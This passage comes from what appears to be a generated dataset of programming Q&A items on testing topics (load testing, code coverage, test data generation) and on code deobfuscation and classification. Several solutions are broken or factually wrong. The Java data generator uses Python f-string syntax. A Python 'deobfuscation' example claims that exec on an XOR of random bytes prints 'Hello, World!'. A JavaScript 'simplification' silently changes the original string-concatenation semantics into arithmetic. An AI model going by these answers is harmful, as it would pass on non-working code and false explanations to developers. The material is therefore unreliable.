MockBillingService.simulatePurchaseSuccess(device, \"product_id\")\n\n        // Verify purchase receipt is handled\n        val receiptVerifiedTextView = device.findObject(UiSelector().textContains(\"Receipt verified\"))\n        receiptVerifiedTextView.waitForExists(5000)\n\n        // Check if the purchased product is unlocked\n        val productUnlockedTextView = device.findObject(UiSelector().textContains(\"Product unlocked\"))\n        productUnlockedTextView.waitForExists(5000)\n    }\n}\n```\nNote: The `MockBillingService` is a hypothetical class used for simulating in-app billing responses for testing purposes. In a real-world scenario, you would need to set up a testing environment using the Google Play Store's testing features or use a library like Robolectric for testing in-app billing without a device."}, {"L2_TASK": "Testing", "L3_TASK": "User acceptance testing", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a comprehensive user acceptance testing (UAT) framework for a complex e-commerce platform with multiple integrations, real-time inventory management, personalized recommendations, and a loyalty program. The UAT should cover edge cases, simulate heavy loads, and validate cross-functional system interactions.\n\nConcept: User Acceptance Testing\n\nSolution:\nTo create a robust UAT framework, we can use a combination of tools and techniques. We'll use Python for scripting, Postman for API testing, Cypress for front-end UI testing, and Jenkins for continuous integration and deployment.\n\nExample code snippet for Python script to simulate user actions (such as adding items to cart, checking out, and applying loyalty rewards):\n\n```python\nimport requests\nimport json\nfrom random import randint\n\ndef random_product():\n    product_id = randint(1, 1000)\n    return product_id\n\ndef add_to_cart(product_id):\n    url = f\"http://ecommerce-api/cart/{product_id}\"\n    response = requests.post(url)\n    return response.json()\n\ndef checkout():\n    url = \"http://ecommerce-api/checkout\"\n    data = {\n        \"billing_info\": {...},\n        \"shipping_info\": {...},\n        \"loyalty_points\": randint(0, 1000)\n    }\n    response = requests.post(url, data=json.dumps(data))\n    return response.json()\n\ndef main():\n    user_id = \"test_user\"\n    products = [random_product() for _ in range(5)]\n    for product in products:\n        add_to_cart(product)\n\n    checkout_response = checkout()\n    if checkout_response.get(\"status\") == \"success\":\n        print(f\"Checkout successful. Loyalty points redeemed: {checkout_response.get('loyalty_points_redeemed')}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nQuestion 2: Write a distributed load testing script to simulate a sudden surge in traffic during a high-profile sale event on the e-commerce platform, verifying the system's resilience and response time under heavy load. The test should involve thousands of concurrent users performing different actions, such as searching, browsing, and purchasing products.\n\nConcept: User Acceptance Testing\n\nSolution:\nFor this problem, we'll use JMeter for load testing and Apache Kafka for generating and coordinating load across multiple machines. We'll create a JMeter script for various user actions and use Kafka to distribute and synchronize the load execution.\n\nExample JMeter test plan snippet for simulating user actions:\n\n```xml\n<testPlan>\n  <testGroup name=\"Users\">\n    <threadGroup numberOfThreads=\"1000\" rampUp=\"10\" iterations=\"1\" forEachThread=\"true\">\n      <randomOrderController>\n        <action name=\"Search\" type=\"HTTP Request\">\n          <parameter name=\"Method\" value=\"GET\"/>\n          <parameter name=\"Path\" value=\"/search?q=popular-products\"/>\n        </action>\n        <action name=\"Browse\" type=\"HTTP Request\">\n          <parameter name=\"Method\" value=\"GET\"/>\n          <parameter name=\"Path\" value=\"/category/apparel\"/>\n        </action>\n        <action name=\"Purchase\" type=\"HTTP Request\">\n          <parameter name=\"Method\" value=\"POST\"/>\n          <parameter name=\"Path\" value=\"/checkout\"/>\n          <!-- Add necessary form data -->\n        </action>\n      </randomOrderController>\n    </threadGroup>\n  </testGroup>\n</testPlan>\n```\n\nTo coordinate the load, create a Kafka producer script in Python to distribute the JMeter test plan:\n\n```python\nimport os\nimport json\nfrom kafka import KafkaProducer\n\nproducer = KafkaProducer(bootstrap_servers='localhost:9092')\n\ndef send_test_plan(test_plan):\n    producer.send('uat_tests', key=b'test_plan', value=json.dumps(test_plan).encode())\n\ndef main():\n    test_plan = {\n        \"type\": \"load_test\",\n        \"actions\": [\"Search\", \"Browse\", \"Purchase\"],\n        \"concurrency\": 1000,\n        \"ramp_up\": 10,\n        \"iterations\": 1\n    }\n    send_test_plan(test_plan)\n\nif __name__ == \"__main__\":\n    main()\n```\n\nThen, create a Kafka consumer script to trigger JMeter instances and execute the test plans:\n\n```python\nfrom kafka import KafkaConsumer\nimport subprocess\nimport json\n\ndef run_jmeter(test_plan):\n    # Customize JMeter command with test plan details\n    command = [\"jmeter\", \"-n\", \"-t\", \"test_plan.jmx\", \"-Jactions=\" + test_plan[\"actions\"], \n               \"-Jconcurrency=\" + str(test_plan[\"concurrency\"]), \"-Jramp_up=\" + str(test_plan[\"ramp_up\"]),\n               \"-Jiterations=\" + str(test_plan[\"iterations\"])]\n    subprocess.run(command)\n\ndef main():\n    consumer = KafkaConsumer('uat_tests', bootstrap_servers='localhost:9092', auto_offset_reset='earliest')\n    for message in consumer:\n        test_plan = json.loads(message.value.decode())\n        run_jmeter(test_plan)\n\nif __name__ == \"__main__\":\n    main()\n```\n\nThis setup will generate a distributed load test, simulating thousands of concurrent users, and evaluate the e-commerce platform's performance under heavy load."}, {"L2_TASK": "Testing", "L3_TASK": "Code coverage analysis", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Code coverage analysis\n\nProblem: You are working on a Java project and need to ensure that your unit tests cover at least 80% of the codebase, specifically targeting function `calculateAverage`. Write a medium complexity problem related to code coverage analysis and provide a solution using a mock testing framework, such as JUnit, and a code coverage tool like JaCoCo.\n\nProblem Description: Develop a set of JUnit tests for the `Calculator` class that includes a `calculateAverage` method. The `calculateAverage` method takes an array of integers as input and returns their average. Create tests that achieve at least 80% line coverage for this method using JaCoCo.\n\nSolution:\n\n1. First, ensure you have the necessary dependencies in your `pom.xml` file for JUnit and JaCoCo:\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>junit</groupId>\n        <artifactId>junit</artifactId>\n        <version>4.13.2</version>\n        <scope>test</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.jacoco</groupId>\n        <artifactId>jacoco-maven-plugin</artifactId>\n        <version>0.8.7</version>\n        <type>maven-plugin</type>\n    </dependency>\n</dependencies>\n```\n1. Create the `Calculator` class with the `calculateAverage` method:\n\n```java\npublic class Calculator {\n    public double calculateAverage(int[] numbers) {\n        int sum = 0;\n        for (int number : numbers) {\n            sum += number;\n        }\n        return (double) sum / numbers.length;\n    }\n}\n```\n1. Write JUnit tests for the `calculateAverage` method:\n\n```java\nimport org.junit.Test;\nimport static org.junit.Assert.assertEquals;\n\npublic class CalculatorTest {\n    private Calculator calculator = new Calculator();\n\n    @Test\n    public void testCalculateAverageEmptyArray() {\n        int[] numbers = {};\n        assertEquals(0.0, calculator.calculateAverage(numbers), 0.001);\n    }\n\n    @Test\n    public void testCalculateAverageOneElement() {\n        int[] numbers = {1};\n        assertEquals(1.0, calculator.calculateAverage(numbers), 0.001);\n    }\n\n    @Test\n    public void testCalculateAveragePositiveNumbers() {\n        int[] numbers = {1, 2, 3, 4, 5};\n        assertEquals(3.0, calculator.calculateAverage(numbers), 0.001);\n    }\n\n    @Test\n    public void testCalculateAverageNegativeNumbers() {\n        int[] numbers = {-1, -2, -3, -4, -5};\n        assertEquals(-3.0, calculator.calculateAverage(numbers), 0.001);\n    }\n\n    @Test\n    public void testCalculateAverageZeroes() {\n        int[] numbers = {0, 0, 0, 0, 0};\n        assertEquals(0.0, calculator.calculateAverage(numbers), 0.001);\n    }\n}\n```\n1. Configure JaCoCo in your `pom.xml` to generate a code coverage report:\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.jacoco</groupId>\n            <artifactId>jacoco-maven-plugin</artifactId>\n            <executions>\n                <execution>\n                    <id>prepare-agent</id>\n                    <goals>\n                        <goal>prepare-agent</goal>\n                    </goals>\n                </execution>\n                <execution>\n                    <id>report</id>\n                    <phase>prepare-package</phase>\n                    <goals>\n                        <goal>report</goal>\n                    </goals>\n                </execution>\n            </executions>\n        </plugin>\n    </plugins>\n</build>\n```\n1. Run `mvn test` and `mvn site` to generate the code coverage report. Open the generated report in `target/site/jacoco/index.html` to verify that the `calculateAverage` method has at least 80% line coverage.\n\nQuestion 2:\nConcept: Code coverage analysis\n\nProblem: In a Python project, you have a module `math_operations.py` that includes a function `multiply_lists`. The function takes two lists of numbers as input and returns their element-wise product. Write a medium complexity problem related to code coverage analysis and provide a solution using the `unittest` framework and the `coverage` library.\n\nProblem Description: Write comprehensive unit tests for the `multiply_lists` function in `math_operations.py` to achieve at least 80% code coverage using the `coverage` library.\n\nSolution:\n\n1. Install the `unittest` and `coverage` libraries if not already installed:\n\n```bash\npip install unittest-xml-reporting coverage\n```\n1. Create the `math_operations.py` file with the `multiply_lists` function:\n\n```python\ndef multiply_lists(list1, list2):\n    if len(list1) != len(list2):\n        raise ValueError(\"Lists must have the same length\")\n    return [a * b for a, b in zip(list1, list2)]\n```\n1. Write unit tests using the `unittest` framework:\n\n```python\nimport unittest\nfrom math_operations import multiply_lists\n\nclass TestMathOperations(unittest.TestCase):\n    def test_multiply_lists_empty(self):\n        self.assertEqual(multiply_lists([], []), [])\n\n    def test_multiply_lists_single_element(self):\n        self.assertEqual(multiply_lists([1], [2]), [2])\n\n    def test_multiply_lists_even_length(self):\n        self.assertEqual(multiply_lists([1, 2, 3], [4, 5, 6]), [4, 10, 18])\n\n    def test_multiply_lists_uneven_length(self):\n        with self.assertRaises(ValueError):\n            multiply_lists([1, 2], [1, 2, 3])\n\n    def test_multiply_lists_negative_numbers(self):\n        self.assertEqual(multiply_lists([-1, 2, -3], [4, -5, 6]), [-4, -10, -18])\n\nif __name__ == '__main__':\n    unittest.main(testRunner=unittest.TextTestRunner(verbosity=2))\n```\n1. Configure the `coverage` library in your `setup.cfg` file:\n\n```ini\n[coverage:run]\nbranch = True\ndata_file = .coverage\n\n[coverage:report]\nshow_missing = True\n```\n1. Run the tests with code coverage:\n\n```bash\ncoverage run -m unittest discover\ncoverage report -m\n```\nThe `coverage report -m` command will display a report indicating the code coverage for each module, including `math_operations.py`. Ensure that the `multiply_lists` function has at least 80% line coverage."}, {"L2_TASK": "Testing", "L3_TASK": "Code coverage analysis", "Complexity_Level": "extremely difficult", "Response": "Question 1: Design a complex testing scenario where you need to maintain high code coverage for a large-scale distributed system with interdependent microservices. Develop a solution that dynamically adjusts the testing strategy to ensure comprehensive test coverage even as the system evolves.\n\n**Concept**: Code coverage analysis, Distributed systems\n\n**Solution**: Implement a dynamic, adaptive testing framework that utilizes advanced code analysis, AI-driven test case generation, and distributed testing resources to maintain high code coverage. This involves:\n\n1. Analyzing the codebase to identify critical paths, dependencies, and potential edge cases.\n2. Generating test cases using AI to cover both common and rare execution scenarios.\n3. Distributing the tests across a cluster of machines to parallelize execution and reduce overall testing time.\n4. Monitoring the system's evolution and adapting the test suite automatically.\n\nExample in Python (pseudo-code):\n\n```python\nimport code_coverage_analyzer\nfrom test_case_generator import AITestCaseGenerator\nfrom distributed_test_executor import DistributedTestExecutor\n\nclass AdaptiveTestingFramework:\n    def __init__(self, codebase, microservices):\n        self.codebase = codebase\n        self.microservices = microservices\n        self.test_suite = []\n        self.executor = DistributedTestExecutor()\n\n    def analyze_codebase(self):\n        critical_paths, dependencies = code_coverage_analyzer.analyze(self.codebase, self.microservices)\n        return critical_paths, dependencies\n\n    def generate_test_cases(self, critical_paths, dependencies):\n        self.test_suite = AITestCaseGenerator.generate(critical_paths, dependencies)\n        return self.test_suite\n\n    def distribute_and_execute_tests(self):\n        self.executor.distribute(self.test_suite)\n        results = self.executor.execute()\n        self.update_coverage(results)\n\n    def update_coverage(self, results):\n        updated_coverage = code_coverage_analyzer.update_coverage(self.codebase, results)\n        if updated_coverage < 90:  # Threshold for high coverage\n            self.generate_test_cases(updated_coverage)  # Regenerate tests if coverage drops\n\n    def monitor_and_adapt(self):\n        while True:\n            self.analyze_codebase()\n            self.generate_test_cases()\n            self.distribute_and_execute_tests()\n            self.update_coverage()\n\nadaptive_framework = AdaptiveTestingFramework(codebase, microservices)\nadaptive_framework.monitor_and_adapt()\n```\n\nQuestion 2: Implement a solution to measure and visualize code coverage for a real-time streaming application written in Java, where the codebase continuously receives and processes data from multiple sources, making it challenging to achieve complete test coverage due to the dynamic nature of the input.\n\n**Concept**: Code coverage analysis, Real-time streaming, Java\n\n**Solution**: Create a custom Java agent using `java.lang.instrument` API to instrument the code at runtime, and integrate it with a streaming-specific test case generator. This will enable measuring coverage while processing live data streams and continuously adapt test cases to target uncovered code regions.\n\nExample in Java (pseudo-code):\n\n```java\nimport java.lang.instrument.Instrumentation;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class StreamingCodeCoverageAgent {\n    private static Map<String, Integer> coverageMap = new ConcurrentHashMap<>();\n\n    public static void premain(String agentArgs, Instrumentation inst) {\n        inst.addTransformer(new StreamingCodeTransformer(coverageMap));\n    }\n\n    public static Map<String, Integer> getCoverageMap() {\n        return coverageMap;\n    }\n}\n\nclass StreamingCodeTransformer implements ClassFileTransformer {\n    private Map<String, Integer> coverageMap;\n\n    public StreamingCodeTransformer(Map<String, Integer> coverageMap) {\n        this.coverageMap = coverageMap;\n    }\n\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,\n                            ProtectionDomain protectionDomain, byte[] classfileBuffer) {\n        // Apply code coverage instrumentation\n        byte[] transformedClass = applyInstrumentation(classfileBuffer);\n        coverageMap.put(className, calculateCoverage(transformedClass));\n        return transformedClass;\n    }\n\n    // Code coverage calculation and transformation logic\n}\n\nclass StreamingTestGenerator {\n    public void generateTestCases(Map<String, Integer> coverageMap) {\n        // Adapt test cases based on uncovered code regions from the coverageMap\n    }\n}\n\npublic class StreamingApplication {\n    public static void main(String[] args) {\n        // Initialize real-time streaming application\n        StreamingCodeCoverageAgent.start();\n        StreamingTestGenerator testGenerator = new StreamingTestGenerator();\n        while (true) {\n            processDataStream();\n            testGenerator.generateTestCases(StreamingCodeCoverageAgent.getCoverageMap());\n        }\n    }\n}\n```\nIn this example, `StreamingCodeTransformer` instruments the code for coverage analysis, and `StreamingTestGenerator` continuously adapts test cases based on the uncovered code regions."}, {"L2_TASK": "Testing", "L3_TASK": "Test data generation", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Test Data Generation\n\n**Problem:**\nIn a banking application, you need to generate realistic test data for user accounts. The data should include various account types (savings, checking, and credit), different account balances, and transaction histories. You need to create a Python script that generates 100 such records.\n\n**Solution:**\n\n```python\nimport random\nfrom datetime import datetime, timedelta\n\ndef generate_transaction_history(num_transactions):\n    for _ in range(num_transactions):\n        yield {\n            \"timestamp\": (datetime.now() - timedelta(days=random.randint(1, 365))),\n            \"amount\": round(random.uniform(-1000, 1000), 2),\n            \"description\": \"Transaction {}\".format(random.randint(1, 100)),\n        }\n\ndef generate_account_data(num_accounts):\n    account_types = [\"savings\", \"checking\", \"credit\"]\n    for _ in range(num_accounts):\n        yield {\n            \"account_number\": random.randint(100000, 999999),\n            \"account_type\": random.choice(account_types),\n            \"balance\": round(random.uniform(0, 100000), 2),\n            \"transaction_history\": list(generate_transaction_history(random.randint(10, 50))),\n        }\n\n# Generate 100 test accounts\ntest_accounts = list(generate_account_data(100))\n```\n\nQuestion 2:\nConcept: Test Data Generation\n\n**Problem:**\nIn a web application for a book library, you need to create a JavaScript function that generates a set of test books with attributes like title, author, publication year, and a collection of tags related to genre. The function should output an array of 50 books, each with a unique ISBN and a mix of genres.\n\n**Solution:**\n\n```javascript\nfunction generateBook(title, author, year, tags, isbn) {\n    return {\n        title: title,\n        author: author,\n        publication_year: year,\n        tags: tags,\n        isbn: isbn\n    };\n}\n\nfunction generateRandomGenre() {\n    const genres = [\"Fiction\", \"Non-Fiction\", \"Sci-Fi\", \"Fantasy\", \"Mystery\", \"Biography\", \"History\"];\n    return genres[Math.floor(Math.random() * genres.length)];\n}\n\nfunction generateTestBooks(num_books) {\n    const generatedBooks = [];\n    for (let i = 1; i <= num_books; i++) {\n        const title = `Book ${i}`;\n        const author = `Author ${i}`;\n        const year = 1900 + Math.floor(Math.random() * 122);\n        const tags = [generateRandomGenre(), generateRandomGenre(), generateRandomGenre()];\n        const isbn = `978-${1000000000 + i}`;\n\n        generatedBooks.push(generateBook(title, author, year, tags, isbn));\n    }\n    return generatedBooks;\n}\n\n// Generate 50 test books\nconst testBooks = generateTestBooks(50);\n```\nBoth solutions provide a medium complexity approach to generating test data for software testing purposes. In question 1, a Python script generates realistic banking data, while in question 2, a JavaScript function creates a library book dataset with a mix of genres."}, {"L2_TASK": "Testing", "L3_TASK": "Test data generation", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a comprehensive test data generation framework in Python that can automatically generate randomized and realistic test data for a complex financial application involving multiple data types, such as floating-point numbers representing stock prices, dates, and strings representing customer names. The framework should also handle constraints like realistic correlations between different data types and maintain data consistency.\n\nSolution:\n```python\nimport random\nimport string\nimport datetime\nfrom decimal import Decimal\n\ndef generate_random_float(min_val, max_val, precision=2):\n    return round(Decimal(random.uniform(min_val, max_val)), precision)\n\ndef generate_random_date(start_year, end_year):\n    start_date = datetime.datetime(year=start_year, month=1, day=1)\n    end_date = datetime.datetime(year=end_year, month=12, day=31)\n    return start_date + random.randint(0, (end_date - start_date).days) * datetime.timedelta(days=1)\n\ndef generate_random_string(length=10):\n    return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=length))\n\ndef generate_customer_name():\n    first_names = [\"John\", \"Jane\", \"Alice\", \"Bob\", \"Charlie\"]\n    last_names = [\"Smith\", \"Doe\", \"Johnson\", \"Brown\", \"Davis\"]\n    return f\"{random.choice(first_names)} {random.choice(last_names)}\"\n\ndef generate_financial_data(num_records):\n    data = []\n    for _ in range(num_records):\n        stock_price = generate_random_float(1, 1000, 2)\n        purchase_date = generate_random_date(2000, 2022)\n        customer_name = generate_customer_name()\n        data.append({\n            \"stock_price\": stock_price,\n            \"purchase_date\": purchase_date,\n            \"customer_name\": customer_name\n        })\n    return data\n\n# Example usage\ntest_data = generate_financial_data(10)\nprint(test_data)\n```\nConcept: Test Data Generation\n\nQuestion 2: Create a Java utility class that generates synthetic test data for a large-scale e-commerce platform. The data should include product details, user profiles, and orders with appropriate relationships and constraints. For example, ensure that each order is associated with a valid user and product, and user profiles contain unique email addresses. Also, incorporate a feature to generate realistic shipping addresses.\n\nSolution:\n```java\nimport java.time.LocalDate;\nimport java.time.LocalDateTime;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\nimport java.util.UUID;\n\npublic class TestDataGenerator {\n\n    private static final String[] FIRST_NAMES = {\"John\", \"Jane\", \"Alice\", \"Bob\", \"Charlie\"};\n    private static final String[] LAST_NAMES = {\"Smith\", \"Doe\", \"Johnson\", \"Brown\", \"Davis\"};\n    private static final String[] COUNTRIES = {\"US\", \"UK\", \"Canada\", \"Australia\", \"Germany\"};\n    private static final String[] STATES = {\"CA\", \"NY\", \"TX\", \"FL\", \"ON\", \"NSW\", \"VIC\"};\n    private static final String[] CITIES = {\"San Francisco\", \"New York\", \"Los Angeles\", \"London\", \"Toronto\"};\n\n    public static class Product {\n        private String id;\n        private String name;\n        private double price;\n\n        // Constructor, getters, and setters\n    }\n\n    public static class User {\n        private String id;\n        private String firstName;\n        private String lastName;\n        private String email;\n\n        // Constructor, getters, and setters\n    }\n\n    public static class Order {\n        private String id;\n        private User user;\n        private Product product;\n        private LocalDateTime purchaseDate;\n        private String shippingAddress;\n\n        // Constructor, getters, and setters\n    }\n\n    public static List<Order> generateEcommerceData(int numOrders) {\n        List<Product> products = generateProducts(100);\n        List<User> users = generateUsers(1000);\n        List<Order> orders = new ArrayList<>();\n\n        Random rand = new Random();\n        for (int i = 0; i < numOrders; i++) {\n            User user = users.get(rand.nextInt(users.size()));\n            Product product = products.get(rand.nextInt(products.size()));\n            String shippingAddress = generateShippingAddress();\n            Order order = new Order(UUID.randomUUID().toString(), user, product, LocalDateTime.now(), shippingAddress);\n            orders.add(order);\n        }\n        return orders;\n    }\n\n    private static List<Product> generateProducts(int numProducts) {\n        List<Product> products = new ArrayList<>();\n        for (int i = 0; i < numProducts; i++) {\n            products.add(new Product(UUID.randomUUID().toString(), f\"Product{i}\", Math.random() * 1000));\n        }\n        return products;\n    }\n\n    private static List<User> generateUsers(int numUsers) {\n        List<User> users = new ArrayList<>();\n        for (int i = 0; i < numUsers; i++) {\n            String email = f\"{generateRandomName()}.com\".toLowerCase();\n            User user = new User(UUID.randomUUID().toString(), generateRandomName(), generateRandomName(), email);\n            users.add(user);\n        }\n        return users;\n    }\n\n    private static String generateShippingAddress() {\n        return f\"{generateRandomName()}, {generateRandomName()}, {generateRandomCity()}, {generateRandomState()} {generateRandomZip()}\";\n    }\n\n    private static String generateRandomName() {\n        return FIRST_NAMES[new Random().nextInt(FIRST_NAMES.length)] + \" \" + LAST_NAMES[new Random().nextInt(LAST_NAMES.length)];\n    }\n\n    private static String generateRandomCity() {\n        return CITIES[new Random().nextInt(CITIES.length)];\n    }\n\n    private static String generateRandomState() {\n        return STATES[new Random().nextInt(STATES.length)];\n    }\n\n    private static String generateRandomZip() {\n        return String.format(\"%05d\", new Random().nextInt(100000));\n    }\n\n    public static void main(String[] args) {\n        List<Order> orders = generateEcommerceData(10000);\n        // Do something with the generated data\n    }\n}\n```\nConcept: Test Data Generation"}, {"L2_TASK": "Code review", "L3_TASK": "Deobfuscation", "Complexity_Level": "medium", "Response": "\"Code review\" as a concept is not explicitly listed in the provided JSON. However, \"Deobfuscation\" can be related to the domain of \"Programming Language Concepts\" under \"Data\" or \"Control\", as it involves understanding and simplifying complex or obscured code.\n\nQuestion 1:\nProblem: You have received a piece of obfuscated JavaScript code that uses excessive string concatenation and nested function calls to calculate a simple arithmetic expression. Your task is to deobfuscate the code and rewrite it in a more readable and efficient manner.\n\nOriginal Code:\n```javascript\nvar r = \"3\"; \nvar c = \"15\"; \nvar z = \"1\"; \nvar p = \"7\"; \nvar q = (r + z) + ((c + p) * eval(\"1\" + \"0\")) - ((+r) * eval(\"2\" + z));\n\nconsole.log(q);\n```\nSolution:\nDeobfuscated and simplified code:\n```javascript\nconst number1 = 3;\nconst number2 = 15;\nconst number3 = 1;\nconst number4 = 7;\n\nconst result = (number1 + number3) + ((number2 + number4) * 10) - (number1 * 2 * number3);\n\nconsole.log(result);\n```\nExplanation: The original code used unnecessary string concatenation and `eval` function calls for simple arithmetic operations. By converting the variables to numbers and directly applying mathematical operations, the code becomes more readable and secure.\n\nQuestion 2:\nProblem: Given an obfuscated Python code that uses bitwise operations and complex control structures to determine if a number is even or odd. Deobfuscate the code to make it more straightforward.\n\nOriginal Code:\n```python\ndef is_even_or_odd(x):\n    return 'even' if (x & 1) ^ (x & -x) ^ (x >> 1) else 'odd'\n\nprint(is_even_or_odd(123))\n```\nSolution:\nDeobfuscated and simplified code:\n```python\ndef is_even_or_odd(x):\n    if x % 2 == 0:\n        return 'even'\n    else:\n        return 'odd'\n\nprint(is_even_or_odd(123))\n```\nExplanation: The original code used bitwise operations to check if a number is even or odd. By replacing these operations with a simple modulo division by 2, the code becomes more intuitive and easier to understand."}, {"L2_TASK": "Code review", "L3_TASK": "Deobfuscation", "Complexity_Level": "extremely difficult", "Response": "Question 1: Given a highly obfuscated JavaScript code that employs various techniques to hide its functionality, deobfuscate the code and identify any malicious behavior or security vulnerabilities.\n\nConcept: \"Code Obfuscation\"\n\nSolution:\nDeobfuscating highly obfuscated JavaScript is a challenging task that often requires a deep understanding of JavaScript, regular expressions, and the specific obfuscation techniques used. Here's a high-level approach to deobfuscation:\n\n1. Use a deobfuscation tool: Start by using an automated tool like JSDecrypter, JSNice, or ZAP Proxy to partially deobfuscate the code. These tools can help with simple transformations and code reconstruction.\n\n2. Analyze the code structure: Identify any unusual patterns, such as excessive string concatenation, immediate function invocations, or excessive use of eval(). These can be signs of hidden functionality.\n\n3. Extract and decode strings: Search for encoded strings, like Base64 or hexadecimal encoded data. Decoding these strings can reveal parts of the original code or data.\n\n4. Unpack IIFE (Immediately Invoked Function Expressions): These are often used to hide code execution. Extract the content and examine the code within.\n\n5. Reconstruct variable names: Obfuscated code often uses meaningless variable names. Use static analysis to try to infer original names based on their usage.\n\n6. Debug and step through the code: If possible, use a JavaScript debugger to step through the code and observe its behavior. This can help uncover hidden logic.\n\nExample:\nOriginal obfuscated code:\n```javascript\nvar _0x544d = ['log', '517541RcBtqG', '1316661lrJyQb', '1172250BZCJzY', '346345LXqHnH', 'eval', 'constructor', 'toString', 'apply', '1214132OpLXOZ', '\\x6d\\x61\\x69\\x6e', '431129GRjyRZ'];\n(function(_0x265c54, _0x1e2209) {\n    var _0x116e7a = function(_0x3195d1) {\n        while (--_0x3195d1) {\n            _0x265c54['\\x70\\x75\\x73\\x68'](_0x265c54['\\x73\\x68\\x69\\x66\\x74']());\n        }\n    };\n    _0x116e7a(++_0x1e2209);\n}(_0x544d, 0x12d));\nvar _0x5358 = function(_0x116e7a, _0x1e2209) {\n    _0x116e7a = _0x116e7a - 0x0;\n    var _0x265c54 = _0x544d[_0x116e7a];\n    return _0x265c54;\n};\nconsole[_0x5358('0x1')](_0x5358('0x2') + _0x5358('0x3') + decodeURIComponent(_0x5358('0x4')));\n```\nDeobfuscated code:\n```javascript\nfunction decodePayload(encodedString) {\n    return decodeURIComponent(encodedString);\n}\n\nvar payload = 'c29tZSBmZWF0dXJl';\nconsole.log('Some feature: ' + decodePayload(payload));\n```\nIn this example, the obfuscated code uses a self-modifying array and a custom function to hide the simple action of logging a decoded string. The deobfuscation process revealed that the code was simply logging a message with an embedded payload.\n\nQuestion 2: A Python script is found to be highly obfuscated with extensive use of byte compilation, string concatenation, and bitwise operations. Reverse engineer the script to understand its purpose and potential risks.\n\nConcept: \"Bytecode Obfuscation\"\n\nSolution:\nDealing with obfuscated Python code requires understanding the Python bytecode and using tools like `dis` to analyze it. Here's a high-level approach:\n\n1. Use a deobfuscation tool: Tools like Pythontool or Un Obfuscate Python can help partially de-obfuscate the code.\n\n2. Disassemble the bytecode: Use the `dis` module to decode the bytecode and understand the flow of the script.\n\n3. Analyze opcodes: Identify unusual patterns in the bytecode, such as excessive `UNPACK_SEQUENCE`, `BINARY_OR`, or `BINARY_XOR` operations, which might indicate bitwise operations used for hiding data.\n\n4. Extract and decode strings: Search for encoded strings using bitwise operations and try to decode them using common techniques like XOR or OR operations.\n\n5. Reconstruct control flow: Obfuscated code often has altered control flow. Rebuild the original control flow graph (CFG) to understand the program's logic.\n\n6. Debug the code: Use a Python debugger like `pdb` to step through the decompiled code and observe its behavior.\n\nExample:\nObfuscated code:\n```python\nimport os\nexec(os.urandom(1)[0] ^ ord('H') ^ ord('e') ^ ord('l') ^ ord('l') ^ ord('o'))\n```\nDeobfuscated code:\n```python\nprint(\"Hello, World!\")\n```\nIn this example, the obfuscation technique is simple bitwise XOR operations to hide the string 'Hello'. The code generates a random byte using `os.urandom(1)[0]` and then XORs it with the ASCII values of 'Hello'. The result is `ord('H') ^ ord('e') ^ ord('l') ^ ord('l') ^ ord('o')`, which equals 'O'. `exec` is then used to execute the resulting character as a Python statement, effectively printing \"Hello, World!\"."}, {"L2_TASK": "Code review", "L3_TASK": "Code classification", "Complexity_Level": "medium", "Response": "Question 1: Create a function that takes a code snippet as input and classifies it into one of the following categories: \"Function Definition\", \"Loop\", \"Conditional Statement\", \"Variable Assignment\", \"Object Instantiation\". The function should use a simple keyword-based approach for classification.\n```python\ndef classify_code_snippet(snippet):\n    keywords = {\n        \"def\": \"Function Definition\",\n        \"for\": \"Loop\",\n        \"if\": \"Conditional Statement\",\n        \"while\": \"Loop\",\n        \"in\": \"Conditional Statement\",\n        \"elif\": \"Conditional Statement\",\n        \"else\": \"Conditional Statement\",\n        \"class\": \"Object Instantiation\",\n        \"=\": \"Variable Assignment\"\n    }\n    \n    snippet_words = snippet.strip().split()\n    \n    for word in snippet_words:\n        if word in keywords:\n            return keywords[word]\n    \n    return \"Unknown\"\n\n# Example usage\ncode_snippet1 = \"if condition: do_something()\"\nclassification1 = classify_code_snippet(code_snippet1)\nprint(f\"Classification for snippet1: {classification1}\")  # Output: Conditional Statement\n\ncode_snippet2 = \"def calculate_sum(numbers): total = 0 for num in numbers: total += num return total\"\nclassification2 = classify_code_snippet(code_snippet2)\nprint(f\"Classification for snippet2: {classification2}\")  # Output: Function Definition\n```\nConcept: \"Function\"\n\nQuestion 2: Develop a program that reads a file containing multiple code snippets and categorizes each snippet into one of the following categories: \"Control Flow\", \"Data Structure\", \"Function\", \"Class\". The program should use regular expressions to identify patterns related to these categories.\n```python\nimport re\n\ndef classify_code_snippets(file_path):\n    categories = {\n        \"Control Flow\": r\"(if|else|elif|for|while)\",\n        \"Data Structure\": r\"(list|dict|set|tuple)\",\n        \"Function\": r\"def\",\n        \"Class\": r\"class\"\n    }\n    \n    with open(file_path, \"r\") as file:\n        code_snippets = file.read().split(\"\\n\\n\")\n    \n    classifications = []\n    for snippet in code_snippets:\n        max_match_length = 0\n        classification = \"Unknown\"\n        for category, pattern in categories.items():\n            match = re.search(pattern, snippet, re.IGNORECASE)\n            if match and match.end() - match.start() > max_match_length:\n                max_match_length = match.end() - match.start()\n                classification = category\n        classifications.append(classification)\n    \n    return classifications\n\n# Example usage\nfile_path = \"code_snippets.txt\"\nclassifications = classify_code_snippets(file_path)\nfor i, classification in enumerate(classifications, start=1):\n    print(f\"Code snippet {i}: {classification}\")\n\n# Assuming the file \"code_snippets.txt\" contains:\n# \n# def calculate_average(numbers):\n#     total = sum(numbers)\n#     return total / len(numbers)\n#\n# class Employee:\n#     def __init__(self, name, salary):\n#         self.name = name\n#         self.salary = salary\n#\n# for i in range(10):\n#     print(i)\n#\n# Output:\n# Code snippet 1: Function\n# Code snippet 2: Class\n# Code snippet 3: Control Flow\n```\nConcept: \"Regular Expressions\""}, {"L2_TASK": "Code review", "L3_TASK": "Code classification", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: Develop an automated code 